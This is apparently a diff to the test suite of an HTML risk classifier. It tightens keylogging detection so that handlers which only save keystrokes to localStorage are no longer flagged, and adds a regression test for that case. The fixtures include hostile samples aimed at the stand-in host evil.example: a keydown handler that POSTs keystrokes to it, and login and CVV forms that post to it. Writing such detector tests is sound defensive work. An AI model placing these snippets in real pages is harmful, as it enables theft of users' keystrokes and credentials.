@@ -115,15 +115,31 @@ describe('htmlSecurity', () => {
       expect(result.findings.some((f) => f.category === 'redirect')).toBe(true)
     })
 
-    it('returns Tier 2 for keylogging pattern', () => {
-      const html = '<script>document.addEventListener("keydown", function(e) { localStorage.setItem("k", e.key); });</script>'
+    it('returns Tier 2 for keylogging pattern (keystroke handler that exfils to network)', () => {
+      // Real keylogging requires a key listener that BOTH reads the
+      // keystroke (event.key) AND ships it out over the network.
+      // Saving keystrokes to localStorage alone is benign (autosave,
+      // progress trackers) and intentionally no longer escalates.
+      const html =
+        '<script>document.addEventListener("keydown", function(e) { fetch("https://evil.example/log", { method: "POST", body: e.key }); });</script>'
       const result = classifyHtmlRisk(html)
       expect(result.tier).toBe(RISK_TIER.HIGH_RISK)
       expect(result.findings.some((f) => f.category === 'keylogging')).toBe(true)
     })
 
+    it('does NOT flag keystroke handler that only saves to localStorage', () => {
+      // Regression test for the false-positive that used to flag
+      // practice-test progress savers as keylogging. With the tightened
+      // detector, no network exfil = no keylogging finding.
+      const html =
+        '<script>document.addEventListener("keydown", function(e) { localStorage.setItem("k", e.key); });</script>'
+      const result = classifyHtmlRisk(html)
+      expect(result.findings.some((f) => f.category === 'keylogging')).toBe(false)
+    })
+
     it('returns Tier 2 for form exfiltration (non-sensitive fields)', () => {
-      const html = '<form action="https://evil.example/collect"><input name="query"><input name="email"></form>'
+      const html =
+        '<form action="https://evil.example/collect"><input name="query"><input name="email"></form>'
       const result = classifyHtmlRisk(html)
       expect(result.tier).toBe(RISK_TIER.HIGH_RISK)
       expect(result.findings.some((f) => f.category === 'exfiltration')).toBe(true)
@@ -144,7 +160,8 @@ describe('htmlSecurity', () => {
     })
 
     it('returns Tier 3 for credential capture (external form + password input)', () => {
-      const html = '<form action="https://evil.example/steal"><input type="password" name="pass"><input type="submit" value="Login"></form>'
+      const html =
+        '<form action="https://evil.example/steal"><input type="password" name="pass"><input type="submit" value="Login"></form>'
       const result = classifyHtmlRisk(html)
       expect(result.tier).toBe(RISK_TIER.QUARANTINED)
       expect(result.findings.some((f) => f.category === 'credential-capture')).toBe(true)
@@ -152,7 +169,8 @@ describe('htmlSecurity', () => {
     })
 
     it('returns Tier 3 for credential capture (external form + sensitive name field)', () => {
-      const html = '<form action="https://evil.example/phish"><input name="password"><input name="cvv"></form>'
+      const html =
+        '<form action="https://evil.example/phish"><input name="password"><input name="cvv"></form>'
       const result = classifyHtmlRisk(html)
       expect(result.tier).toBe(RISK_TIER.QUARANTINED)
       expect(result.findings.some((f) => f.category === 'credential-capture')).toBe(true)
@@ -163,7 +181,8 @@ describe('htmlSecurity', () => {
         '<script>',
         'String.fromCharCode(65);'.repeat(5), // obfuscation
         'window.location.href = "https://evil.example";', // redirect
-        'document.addEventListener("keydown", function(e) { localStorage.setItem("k", e.key); });', // keylogging
+        // Real keylogging: keydown handler that ships event.key out via fetch
+        'document.addEventListener("keydown", function(e) { fetch("https://evil.example/log", { method: "POST", body: e.key }); });',
         '</script>',
       ].join('\n')
       const result = classifyHtmlRisk(html)
@@ -323,7 +342,9 @@ describe('htmlSecurity', () => {
 
     it('generates single-category summary', () => {
       const findings = [{ category: 'obfuscation', severity: 'high', message: 'test' }]
-      expect(generateRiskSummary(RISK_TIER.HIGH_RISK, findings)).toBe('Contains obfuscated JavaScript.')
+      expect(generateRiskSummary(RISK_TIER.HIGH_RISK, findings)).toBe(
+        'Contains obfuscated JavaScript.',
+      )
     })
 
     it('generates two-category summary with "and"', () => {
@@ -331,7 +352,9 @@ describe('htmlSecurity', () => {
         { category: 'obfuscation', severity: 'high', message: 'test' },
         { category: 'redirect', severity: 'high', message: 'test' },
       ]
-      expect(generateRiskSummary(RISK_TIER.HIGH_RISK, findings)).toBe('Contains obfuscated JavaScript and page redirect behavior.')
+      expect(generateRiskSummary(RISK_TIER.HIGH_RISK, findings)).toBe(
+        'Contains obfuscated JavaScript and page redirect behavior.',
+      )
     })
 
     it('generates multi-category summary with Oxford comma', () => {
@@ -341,7 +364,9 @@ describe('htmlSecurity', () => {
         { category: 'credential-capture', severity: 'critical', message: 'test' },
       ]
       const summary = generateRiskSummary(RISK_TIER.QUARANTINED, findings)
-      expect(summary).toBe('Contains obfuscated JavaScript, page redirect behavior, and credential capture indicators.')
+      expect(summary).toBe(
+        'Contains obfuscated JavaScript, page redirect behavior, and credential capture indicators.',
+      )
     })
 
     it('skips validation and system categories', () => {
